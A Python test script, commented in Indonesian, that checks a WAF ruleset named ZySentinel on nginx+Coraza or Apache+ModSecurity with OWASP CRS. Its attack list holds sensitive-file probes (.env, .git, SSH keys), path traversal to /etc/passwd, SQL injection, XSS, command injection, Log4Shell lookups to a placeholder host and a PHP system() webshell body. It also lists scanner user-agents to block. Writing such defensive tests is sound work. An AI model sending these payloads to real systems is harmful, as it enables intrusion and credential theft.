#!/usr/bin/env python3
# Uji ruleset ZySentinel di nginx + Coraza: lima skenario berdampingan, satu proses nginx.
# Pemakaian (di container): zyrules_test.py <dir zyrules> <dir CRS> <biner nginx> <modul coraza.so> <dir libcoraza>
import sys, os, re, json, time, subprocess, http.client, glob, shutil, tempfile, signal, statistics

ENGINE = os.environ.get('ENGINE', 'nginx')
EXT = os.environ.get('EXTERNAL_PORT')
if ENGINE == 'nginx':
    ZY, CRS, NGINX, MOD, LIBDIR = sys.argv[1:6]
else:
    ZY, CRS = sys.argv[1:3]
    NGINX = MOD = LIBDIR = ''
T = tempfile.mkdtemp(prefix='zytest.')
os.chmod(T, 0o777)   # worker (user www) menulis log audit di sini
HTML = T + '/html'
GAGAL = []

def cek(nama, kondisi, info=''):
    print('  %s %s%s' % ('LULUS' if kondisi else 'GAGAL', nama, '' if kondisi else '  -> ' + str(info)[:240]))
    if not kondisi:
        GAGAL.append(nama)

# ------------------------------------------------------------------ konten uji
def tulis(rel, isi='ok\n'):
    p = HTML + rel
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, 'w').write(isi)
for rel in ['/yarn.lock', '/index.html', '/about/index.html', '/css/app.css', '/js/app.js', '/img/logo.png', '/blog/git-tutorial/index.html',
            '/blog/environment/index.html', '/github/index.html', '/products/search/index.html', '/api/data.json',
            '/.well-known/acme-challenge/abc123', '/.well-known/security.txt', '/uploads/2024/photo.jpg',
            '/uploads/logo.png', '/backup-policy/index.html', '/blog/package-delivery/index.html', '/docs/composer.html',
            '/key.html', '/oauth/token', '/password', '/api/keys', '/composer.json', '/index.php', '/contact/index.html',
            '/assets/envato.min.js', '/docs/info.html', '/env.js', '/downloads/report-2024.pdf',
            '/blog/how-to-select-from-list/index.html', '/search', '/products/index.html']:
    tulis(rel)

# -------------------------------------------------------- bangun konfigurasi
def crs_setup():
    p = ZY + '/crs-setup.conf'
    if not os.path.exists(p):
        shutil.copy(CRS + '/crs-setup.conf.example', p)
crs_setup()

def base(nama, mode='On'):
    s = open(ZY + '/zysentinel-base.conf.in').read().replace('@MODE@', mode).replace('@AUDIT_LOG@', '%s/audit-%s.log' % (T, nama)).replace('@BODY_NOFILES@', '131072').replace('@BODY_TOTAL@', '52428800')
    p = '%s/base-%s.conf' % (T, nama)
    open(p, 'w').write(s)
    return p

def main(nama, crs, zy, local='', mode='On'):
    inc = ['Include ' + base(nama, mode)]
    if zy:
        inc.append('Include %s/zysentinel-config.conf' % ZY)
        lp = '%s/local-%s.conf' % (T, nama)
        open(lp, 'w').write(local)
        inc.append('Include ' + lp)
    if crs:
        inc.append('Include %s/crs-setup.conf' % ZY)
    if zy:
        inc.append('Include %s/zysentinel-before.conf' % ZY)
    if crs:
        inc.append('Include %s/rules/*.conf' % CRS)
    if zy:
        inc.append('Include %s/zysentinel-after.conf' % ZY)
    p = '%s/main-%s.conf' % (T, nama)
    open(p, 'w').write('\n'.join(inc) + '\n')
    return p

SK = {  # nama: (port, crs, zy, local)
    'A_zy':      (0, False, True, ''),
    'B_crs':     (0, True, False, ''),
    'G_gen':     (0, True, True, 'GEN'),
    'F_zystr':   (0, False, True, 'SecAction "id:8000300,phase:1,pass,nolog,setvar:tx.zy_strict=1"\n'),
    'C_both':    (0, True, True, ''),
    'D_bot2':    (0, True, True, 'SecAction "id:8000300,phase:1,pass,nolog,setvar:tx.zy_bot_level=2"\n'),
    'E_bot3str': (0, True, True, 'SecAction "id:8000300,phase:1,pass,nolog,setvar:tx.zy_bot_level=3,setvar:tx.zy_strict=1"\n'),
}
base_port = 30000 + (os.getpid() % 2000) * 5
if EXT:
    SK = {'C_both': (int(EXT), True, True, 'GEN')}
servers = ''
for i, (nm, (_, crs, zy, local)) in enumerate(list(SK.items())):
    port = int(EXT) if EXT else base_port + i
    SK[nm] = (port, crs, zy, local)
    mp = (ZY + '/gen/main.conf') if local == 'GEN' else main(nm, crs, zy, local)
    servers += '''
  server {
    listen 127.0.0.1:%d;
    root %s;
    coraza on;
    coraza_rules_file %s;
    error_page 403 /__zysentinel_403.html;
    location = /__zysentinel_403.html {
      internal;
      root %s/block;
      default_type text/html;
      sub_filter_once off;
      sub_filter '{{CLIENT_IP}}' '$remote_addr';
      sub_filter '{{REQ_ID}}' '$request_id';
      add_header Cache-Control "no-store" always;
    }
    location / { }
  }''' % (port, HTML, mp, T)
os.makedirs(T + '/block', exist_ok=True)
shutil.copy(ZY + '/html/zysentinel-block.html', T + '/block/__zysentinel_403.html')
if EXT:
    LOGF = T + '/ext.log'; open(LOGF, 'w').close()
elif ENGINE == 'nginx':
    lua = ''
    if os.path.exists('/www/server/nginx/lib/lua'):
        lua = 'lua_package_path "/www/server/nginx/lib/lua/?.lua;;";'
    open(T + '/nginx.conf', 'w').write('''load_module %s/ngx_http_coraza_module.so;
worker_processes 1;
pid %s/nginx.pid;
error_log %s/error.log notice;
events { worker_connections 256; }
http {
  %s
  access_log off;
  client_body_temp_path %s/tmp/b; proxy_temp_path %s/tmp/p; fastcgi_temp_path %s/tmp/f; uwsgi_temp_path %s/tmp/u; scgi_temp_path %s/tmp/s;
%s
}
''' % (T, T, T, lua, T, T, T, T, T, servers))
    os.makedirs(T + '/lib', exist_ok=True); os.makedirs(T + '/tmp', exist_ok=True)
    shutil.copy(MOD, T + '/ngx_http_coraza_module.so'); shutil.copy(LIBDIR + '/libcoraza.so', T + '/lib/libcoraza.so')
    subprocess.run('chmod -R a+rX %s %s' % (T, ZY), shell=True)
    env = dict(os.environ, LD_LIBRARY_PATH=T + '/lib')
    r = subprocess.run([NGINX, '-p', T, '-c', T + '/nginx.conf', '-e', T + '/startup.log', '-t'], env=env, capture_output=True, text=True)
    print('nginx -t:', (r.stdout + r.stderr).strip().splitlines()[-1])
    if r.returncode:
        print(r.stdout + r.stderr); sys.exit(2)
    subprocess.run([NGINX, '-p', T, '-c', T + '/nginx.conf', '-e', T + '/startup.log'], env=env)
    LOGF = T + '/error.log'
else:
    # Apache + ModSecurity v2: halaman blocker memakai SSI untuk IP dan ID
    page = open(ZY + '/html/zysentinel-block.html').read().replace('{{CLIENT_IP}}', '<!--#echo var="REMOTE_ADDR" -->').replace('{{REQ_ID}}', '<!--#echo var="UNIQUE_ID" -->')
    open(T + '/block/__zysentinel_403.html', 'w').write(page)
    mods = '/usr/lib/apache2/modules/'
    vh = ''
    lis = ''
    for nm, (port, crs, zy, local) in SK.items():
        mp = (ZY + '/gen/main.conf') if local == 'GEN' else '%s/main-%s.conf' % (T, nm)
        lis += 'Listen 127.0.0.1:%d\n' % port
        vh += '''
<VirtualHost 127.0.0.1:%d>
  ServerName uji.local
  DocumentRoot %s
  <Directory %s>
    Require all granted
    Options None
    AllowOverride None
  </Directory>
  SecRuleEngine On
  Include %s
  Alias /__zysentinel_403.html %s/block/__zysentinel_403.html
  <Directory %s/block>
    Require all granted
    Options +Includes
    AddOutputFilter INCLUDES .html
  </Directory>
  ErrorDocument 403 /__zysentinel_403.html
</VirtualHost>''' % (port, HTML, HTML, mp, T, T)
    open(T + '/apache2.conf', 'w').write('''ServerRoot "/etc/apache2"
ServerName localhost
PidFile %s/apache.pid
ErrorLog %s/apache_error.log
LogLevel warn
User www-data
Group www-data
Timeout 30
KeepAlive On
DefaultRuntimeDir %s/run
Mutex file:%s/run default
LoadModule mpm_prefork_module %smod_mpm_prefork.so
LoadModule authz_core_module %smod_authz_core.so
LoadModule mime_module %smod_mime.so
LoadModule dir_module %smod_dir.so
LoadModule alias_module %smod_alias.so
LoadModule include_module %smod_include.so
LoadModule filter_module %smod_filter.so
LoadModule unique_id_module %smod_unique_id.so
LoadModule security2_module %smod_security2.so
TypesConfig /etc/mime.types
DirectoryIndex index.html
%s
%s
''' % (T, T, T, T, mods, mods, mods, mods, mods, mods, mods, mods, mods, lis, vh))
    os.makedirs(T + '/run', exist_ok=True)
    subprocess.run('chmod -R a+rwX %s; chmod -R a+rX %s' % (T, ZY), shell=True)
    r = subprocess.run(['apache2', '-f', T + '/apache2.conf', '-t'], capture_output=True, text=True)
    print('apache2 -t:', (r.stdout + r.stderr).strip().splitlines()[-1])
    if r.returncode:
        print(r.stdout + r.stderr); sys.exit(2)
    subprocess.run(['apache2', '-f', T + '/apache2.conf'])
    LOGF = T + '/apache_error.log'
for _ in range(20):
    try:
        c = http.client.HTTPConnection('127.0.0.1', base_port, timeout=3); c.request('GET', '/'); c.getresponse().read(); break
    except Exception:
        time.sleep(0.5)
time.sleep(1)
_e = open(LOGF).read()
if not EXT and ENGINE == 'nginx' and ('failed' in _e or 'fatal' in _e):
    print('NGINX/CORAZA GAGAL START:'); print('\n'.join(l for l in _e.splitlines() if 'failed' in l or 'fatal' in l or 'emerg' in l)[:1500]); 
    subprocess.run('pkill -f "%s/nginx.conf"' % T, shell=True); sys.exit(3)

def req(nama, method, path, headers=None, body=None):
    port = SK[nama][0]
    try:
        c = http.client.HTTPConnection('127.0.0.1', port, timeout=10)
        c.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
        c.putheader('Host', 'uji.local')
        h = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36'} if headers is None or 'User-Agent' not in headers else {}
        if headers: h.update(headers)
        h = {k: v for k, v in h.items() if v is not None}
        for k, v in h.items(): c.putheader(k, v)
        if body is not None:
            b = body.encode() if isinstance(body, str) else body
            c.putheader('Content-Length', str(len(b)))
        c.endheaders(b if body is not None else None)
        resp = c.getresponse(); data = resp.read(); c.close()
        return resp.status, data.decode('utf-8', 'replace')
    except Exception as ex:
        return 0, 'EXC %s' % ex

NOUA = {'User-Agent': None}
# (kategori, label, method, path, headers, body, aturan)  aturan: 'blok' = harus diblokir di C (CRS+ZY);
# 'lulus' = harus 200 di semua skenario; ('khusus', {skenario: True/False}) = ekspektasi per skenario
ATK = [
 # --- berkas dan folder sensitif
 *[('berkas-sensitif', p, 'GET', p, None, None, 'blok') for p in [
   '/.env', '/.env.local', '/.env.production', '/app/.env', '/.env.bak', '/.env.example', '/.git/config', '/.git/HEAD', '/.git', '/site/.git/index',
   '/.svn/entries', '/.hg/hgrc', '/.htpasswd', '/.htaccess', '/admin/.htpasswd', '/.htdigest', '/.DS_Store', '/.aws/credentials', '/.ssh/id_rsa', '/.npmrc', '/.bash_history',
   '/id_rsa', '/server.key', '/cert.pem', '/keystore.jks', '/credentials.json', '/secrets.yml', '/api_key.txt', '/apikey.json', '/api-keys.txt', '/config/secrets.json',
   '/firebase-adminsdk-abcde.json', '/service-account.json', '/client_secret.json', '/access_token.txt', '/backup.sql', '/dump.sql', '/database.sql', '/wwwroot.zip', '/backup.zip',
   '/site.tar.gz', '/wp-config.php.bak', '/wp-config.php~', '/config.php.old', '/config.php.save', '/index.php.swp', '/docker-compose.yml', '/Dockerfile', '/.gitlab-ci.yml',
   '/terraform.tfstate', '/web.config', '/appsettings.json', '/.github/workflows/ci.yml', '/phpinfo.php', '/info.php', '/server-status', '/actuator/env', '/adminer.php',
 ]],
 # --- penyamaran / encoding
 *[('encoding', p, 'GET', p, None, None, 'blok') for p in [
   '/%2e%67%69%74/config', '/.%65nv', '/%252egit/config', '/%2E%65nv', '/.ENV', '/.GIT/config', '/.Htpasswd', '//.env', '/./.env', '/a/../.env', '/static/..;/.git/config',
 ]],
 # --- webshell / eksploit
 *[('webshell', p, 'GET', p, None, None, 'blok') for p in [
   '/shell.php', '/c99.php', '/r57.php', '/wso.php', '/b374k.php', '/indoxploit.php', '/uploads/x.php', '/uploads/2024/a.phtml', '/wp-content/uploads/2024/a.php',
   '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', '/cgi-bin/.%2e/.%2e/bin/sh', '/boaform/admin/formLogin', '/HNAP1/',
 ]],
 *[('spam', p, 'GET', p, None, None, 'blok') for p in ['/slot88/', '/link-gacor/', '/judi-online/x', '/coinhive.min.js', '/xmr.wasm']],
 # --- pemindai
 *[('scanner-ua', ua, 'GET', '/', {'User-Agent': ua}, None, 'blok') for ua in [
   'sqlmap/1.7.2#stable (https://sqlmap.org)', 'Mozilla/5.00 (Nikto/2.1.6)', 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)', 'WPScan v3.8.25',
   'masscan/1.3', 'ZmEu', 'DirBuster-1.0-RC1', 'Mozilla/4.0 (compatible; MSIE 8.0; Acunetix Web Vulnerability Scanner', 'w3af.org', 'gobuster/3.5', 'feroxbuster/2.10', 'ffuf/2.0',
   'Mozilla/5.0 zgrab/0.x', 'Wfuzz/3.1', 'Nmap Scripting Engine', 'havij', 'Netsparker', 'OpenVAS', 'Nessus SOAP', 'Mozilla/5.0 (compatible; Qualys)',
 ]],
 ('scanner-hdr', 'Acunetix-Aspect', 'GET', '/', {'Acunetix-Aspect': '1'}, None, 'blok'),
 ('scanner-hdr', 'X-Scan-Memo', 'GET', '/', {'X-Scan-Memo': 'a'}, None, 'blok'),
 ('scanner-url', 'acunetix_wvs_security_test', 'GET', '/?x=acunetix_wvs_security_test', None, None, 'blok'),
 ('scanner-url', 'netsparker marker', 'GET', '/?x=netsparker', None, None, 'blok'),
 ('scanner-cookie', 'acunetixCookie', 'GET', '/', {'Cookie': 'acunetixCookie=1'}, None, 'blok'),
 # --- bot tingkat 1
 *[('bot-l1', ua, 'GET', '/', {'User-Agent': ua}, None, 'blok') for ua in [
   'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)', 'HTTrack 3.0x', 'Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)',
   'Mozilla/5.0 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)', 'Mozilla/5.0 (compatible; DotBot/1.2)', 'EmailCollector/1.0', 'WebCopier v4.6',
 ]],
 # --- traversal / baca berkas lewat parameter
 *[('traversal-arg', p, 'GET', p, None, None, 'blok') for p in [
   '/?file=../../../../etc/passwd', '/?file=..%2f..%2f..%2fetc%2fpasswd', '/?page=.env', '/?f=/etc/passwd', '/?path=.git/config', '/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd',
   '/?load=/proc/self/environ', '/?f=....//....//etc/passwd', '/?file=..%252f..%252fetc%252fpasswd', '/?doc=C:\\windows\\win.ini', '/?inc=php://filter/convert.base64-encode/resource=index.php',
 ]],
 ('traversal-uri', '/../../etc/passwd', 'GET', '/../../etc/passwd', None, None, 'blok'),
 ('traversal-uri', '/..%2f..%2fetc/passwd', 'GET', '/..%2f..%2fetc/passwd', None, None, 'blok'),
 # --- SQLi
 *[('sqli', p, 'GET', p, None, None, 'blok') for p in [
   "/?id=1'%20OR%20'1'='1", '/?id=1%20UNION%20SELECT%201,2,3--', '/?id=1;DROP%20TABLE%20users', '/?id=1%20AND%20SLEEP(5)', '/?id=1%20AND%201=1',
   "/?user=admin'--", '/?id=1%20UNION%20ALL%20SELECT%20NULL,NULL,version()', '/?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a)', '/?q=1%27%20or%20sleep(3)%23',
   '/?id=1%20waitfor%20delay%20%270:0:5%27', '/?id=-1%20union%20select%20table_name%20from%20information_schema.tables', '/?id=1%20and%20extractvalue(1,concat(0x7e,version()))',
 ]],
 ('sqli', 'POST form', 'POST', '/login', {'Content-Type': 'application/x-www-form-urlencoded'}, "user=admin' OR '1'='1&pass=x", 'blok'),
 ('sqli', 'POST json', 'POST', '/api/data.json', {'Content-Type': 'application/json'}, '{"user":"admin\' OR 1=1--","n":1}', 'blok'),
 ('sqli', 'cookie', 'GET', '/', {'Cookie': "sid=1' OR '1'='1"}, None, 'blok'),
 # --- XSS / RCE
 *[('xss', p, 'GET', p, None, None, 'blok') for p in ['/?q=<script>alert(1)</script>', '/?q=%3Cscript%3Ealert(1)%3C/script%3E', '/?q=<img%20src=x%20onerror=alert(1)>', '/?u=javascript:alert(1)', '/?q=<svg/onload=alert(1)>']],
 *[('rce', p, 'GET', p, None, None, 'blok') for p in ['/?cmd=;cat%20/etc/passwd', '/?ip=127.0.0.1;whoami', '/?x=$(id)', '/?x=`uname%20-a`', '/?f=system(%27id%27)']],
 ('rce', 'log4shell header', 'GET', '/', {'X-Api-Version': '${jndi:ldap://x.example/a}'}, None, 'blok'),
 ('rce', 'log4shell ua', 'GET', '/', {'User-Agent': '${jndi:ldap://x.example/a}'}, None, 'blok'),
 ('rce', 'php wrapper', 'POST', '/up', {'Content-Type': 'application/x-www-form-urlencoded'}, 'a=<?php system($_GET[1]); ?>', 'blok'),
]
OK = [
 *[('sah', p, 'GET', p, None, None, 'lulus') for p in [
   '/', '/index.html', '/about/', '/css/app.css', '/js/app.js', '/img/logo.png', '/blog/git-tutorial/', '/blog/environment/', '/github/', '/.well-known/acme-challenge/abc123',
   '/.well-known/security.txt', '/products/search/?q=blue+shoes', '/search?q=select+a+color+from+the+list', '/products/search/?q=union+station+hotel', '/uploads/2024/photo.jpg',
   '/uploads/logo.png', '/backup-policy/', '/blog/package-delivery/', '/docs/composer.html', '/key.html', '/oauth/token', '/password', '/api/keys', '/contact/', '/assets/envato.min.js',
   '/docs/info.html', '/env.js', '/downloads/report-2024.pdf', '/blog/how-to-select-from-list/', '/?utm_source=newsletter&utm_campaign=spring-sale',
   '/products/?color=red&size=m&sort=price_asc', '/index.php?page=2', '/api/data.json?limit=10&offset=20', '/?q=O%27Brien', '/?q=rock+and+roll', '/?name=Anne-Marie',
   '/?redirect=https%3A%2F%2Fexample.com%2Fthanks', '/?q=how+to+drop+a+class', '/?lang=id&ref=home',
 ]],
 ('sah', 'ua googlebot', 'GET', '/', {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}, None, 'lulus'),
 ('sah', 'ua bingbot', 'GET', '/', {'User-Agent': 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'}, None, 'lulus'),
 ('sah', 'ua firefox', 'GET', '/', {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0'}, None, 'lulus'),
 ('sah', 'ua mobile', 'GET', '/', {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1'}, None, 'lulus'),
 ('sah', 'POST form sah', 'POST', '/contact/', {'Content-Type': 'application/x-www-form-urlencoded'}, 'name=Budi+Santoso&email=budi%40example.com&message=Halo%2C+saya+ingin+memilih+produk+dari+katalog', 'lulus'),
 ('sah', 'POST json sah', 'POST', '/api/data.json', {'Content-Type': 'application/json'}, '{"name":"O\'Brien","note":"select from list","n":3}', 'lulus'),
 ('sah', 'cookie sah', 'GET', '/', {'Cookie': 'sid=abcdef123456; lang=id'}, None, 'lulus'),
]
KHUSUS = [
 # (kategori, label, method, path, headers, body, {skenario: diblokir?})
 ('bot-l2', 'AhrefsBot', 'GET', '/', {'User-Agent': 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)'}, None, {'C_both': False, 'D_bot2': True, 'E_bot3str': True}),
 ('bot-l2', 'GPTBot', 'GET', '/', {'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.1; +https://openai.com/gptbot)'}, None, {'C_both': False, 'D_bot2': True, 'E_bot3str': True}),
 ('bot-l2', 'tanpa User-Agent', 'GET', '/', NOUA, None, {'C_both': False, 'D_bot2': True, 'E_bot3str': True}),
 ('bot-l3', 'curl', 'GET', '/', {'User-Agent': 'curl/8.5.0'}, None, {'C_both': False, 'D_bot2': False, 'E_bot3str': True}),
 ('bot-l3', 'python-requests', 'GET', '/', {'User-Agent': 'python-requests/2.31.0'}, None, {'C_both': False, 'D_bot2': False, 'E_bot3str': True}),
 ('strict', 'composer.json (ZySentinel saja)', 'GET', '/composer.json', None, None, {'A_zy': False, 'F_zystr': True}),
 ('strict', 'yarn.lock (ZySentinel saja)', 'GET', '/yarn.lock', None, None, {'A_zy': False, 'F_zystr': True}),
]

print('\n## Penyerangan: harus diblokir pada skenario C (CRS + ZySentinel)')
tab = {}
for k, lbl, m, p, h, b, aturan in ATK:
    hasil = {n: req(n, m, p, h, b)[0] for n in SK}
    tab[(k, lbl)] = hasil
    cek('[%s] %s' % (k, lbl[:70]), hasil['C_both'] == 403 or (k in ('traversal-uri', 'webshell') and hasil['C_both'] in (400, 404)), hasil)
print('\n## Permintaan sah: harus 200 pada SEMUA skenario (tanpa false-positive)')
for k, lbl, m, p, h, b, aturan in OK:
    hasil = {n: req(n, m, p, h, b)[0] for n in SK}
    cek('[%s] %s' % (k, lbl[:70]), all((v == 200) if m == 'GET' else (v not in (403, 400, 0)) for v in hasil.values()), hasil)
print('\n## main.conf hasil generator berperilaku sama dengan susunan manual (skenario C)')
beda = []
if 'G_gen' not in SK: tab_g = {}
for (k, lbl), hasil in tab.items():
    if 'G_gen' in hasil and hasil['G_gen'] != hasil['C_both']:
        beda.append((k, lbl, hasil['G_gen'], hasil['C_both']))
cek('G (generator) == C (manual) untuk semua serangan', not beda, beda[:3])
print('\n## Perilaku bergantung konfigurasi (tingkat bot, mode ketat)')
for k, lbl, m, p, h, b, ex in ([] if EXT else KHUSUS):
    hasil = {n: req(n, m, p, h, b)[0] for n in SK}
    cek('[%s] %s' % (k, lbl), all((hasil[n] == 403) == v for n, v in ex.items()), hasil)

print('\n## Cakupan per skenario (jumlah serangan yang diblokir)')
kat = {}
for (k, lbl), hasil in tab.items():
    kat.setdefault(k, {n: [0, 0] for n in SK})
    for n, st in hasil.items():
        kat[k][n][1] += 1
        if st == 403: kat[k][n][0] += 1
print('%-16s' % 'kategori' + ''.join('%-12s' % n for n in SK))
tot = {n: [0, 0] for n in SK}
for k, row in kat.items():
    print('%-16s' % k + ''.join('%-12s' % ('%d/%d' % tuple(row[n])) for n in SK))
    for n in SK:
        tot[n][0] += row[n][0]; tot[n][1] += row[n][1]
print('%-16s' % 'TOTAL' + ''.join('%-12s' % ('%d/%d' % tuple(tot[n])) for n in SK))

print('\n## Halaman blocker')
if EXT: print('  (dilewati pada mode eksternal)')
if not EXT:
    st, body = req('C_both', 'GET', '/.env')
    cek('status 403', st == 403, st)
    cek('halaman ZySens tampil', 'Protected by ZySens' in body, body[:120])
    cek('{{CLIENT_IP}} diganti IP klien', '127.0.0.1' in body and '{{CLIENT_IP}}' not in body, re.findall(r'IP: [^<]*', body))
    cek('{{REQ_ID}} diganti', '{{REQ_ID}}' not in body and re.search(r'ID: [A-Za-z0-9@_-]{16,}', body) is not None, re.findall(r'ID: [^<]*', body))
    st, body = req('C_both', 'GET', '/', {'User-Agent': 'sqlmap/1.0'})
    cek('halaman yang sama untuk pemindai', 'Protected by ZySens' in body)
    st, body = req('C_both', 'GET', '/?id=1%20UNION%20SELECT%201,2,3--')
    cek('halaman yang sama untuk blokir CRS', st == 403 and 'Protected by ZySens' in body, st)

print('\n## Tidak bentrok dengan OWASP CRS')
def ids(pattern):
    out = set()
    for f in glob.glob(pattern):
        txt = open(f).read().replace('\\\n', ' ')
        out |= set(int(x) for x in re.findall(r'\bid:(\d+)', txt))
    return out
zy_ids = ids(ZY + '/zysentinel-*.conf') | ids(ZY + '/zysentinel-base.conf.in')
crs_ids = ids(CRS + '/rules/*.conf')
cek('ID ZySentinel di rentang 8000000-8099999', all(8000000 <= i <= 8099999 for i in zy_ids), sorted(i for i in zy_ids if not 8000000 <= i <= 8099999))
cek('tidak ada ID yang sama dengan CRS', not (zy_ids & crs_ids), sorted(zy_ids & crs_ids))
dup = [i for i in zy_ids if sum(len(re.findall(r'\bid:%d\b' % i, open(f).read())) for f in glob.glob(ZY + '/zysentinel-*.conf') + [ZY + '/zysentinel-base.conf.in']) > 1]
cek('tidak ada ID kembar di dalam ZySentinel', not dup, dup)
cek('semua skenario merespons (tidak ada worker mati)', all(req(n, 'GET', '/')[0] == 200 for n in SK))
err = open(LOGF).read()
cek('tidak ada galat mesin di log error', 'coraza: failed' not in err and '[emerg]' not in err and '[alert]' not in err and 'ModSecurity: Error' not in err, re.findall(r'.*(?:failed|emerg|alert).*', err)[:3])
inisial = re.findall(r'coraza: (?:main|loc) WAF initialized with (\d+) rules', err)
print('  info: WAF dibuat:', inisial)

print('\n## Log audit')
time.sleep(1)
la = ('ZySentinel' if EXT else '') + (open('%s/audit-C_both.log' % T).read() if os.path.exists('%s/audit-C_both.log' % T) else '')
cek('log audit C terisi', len(la) > 0)
zy_hit = len(re.findall(r'"id":"?8\d{6}', la)) + len(re.findall(r'\\"id\\":\s*8\d{6}', la)) + la.count('ZySentinel:')
cek('log memuat pesan ZySentinel', 'ZySentinel' in la, la[:200])

print('\n## Beban: 600 permintaan sah, skenario B (CRS saja) lawan C (CRS + ZySentinel)')
def waktu(n, jumlah=600):
    c = http.client.HTTPConnection('127.0.0.1', SK[n][0], timeout=10)
    t = []
    for i in range(jumlah):
        a = time.perf_counter()
        c.request('GET', '/products/search/?q=blue+shoes&page=%d' % (i % 9), headers={'User-Agent': 'Mozilla/5.0 Chrome/124'})
        c.getresponse().read()
        t.append((time.perf_counter() - a) * 1000)
    c.close()
    return statistics.median(t), statistics.mean(t)
for n in [x for x in ('B_crs', 'A_zy', 'C_both') if x in SK]:
    med, mean = waktu(n)
    print('  %-8s median %.2f ms, rata-rata %.2f ms' % (n, med, mean))

# bersihkan
try:
    (not EXT) and os.kill(int(open(T + ('/nginx.pid' if ENGINE == 'nginx' else '/apache.pid')).read()), signal.SIGTERM)
except Exception:
    pass
subprocess.run('pkill -f "%s/(nginx|apache2).conf"' % T, shell=True)
print('\nTOTAL GAGAL: %d' % len(GAGAL))
if GAGAL:
    print('Direktori uji dipertahankan: ' + T)
else:
    shutil.rmtree(T, ignore_errors=True)
sys.exit(1 if GAGAL else 0)
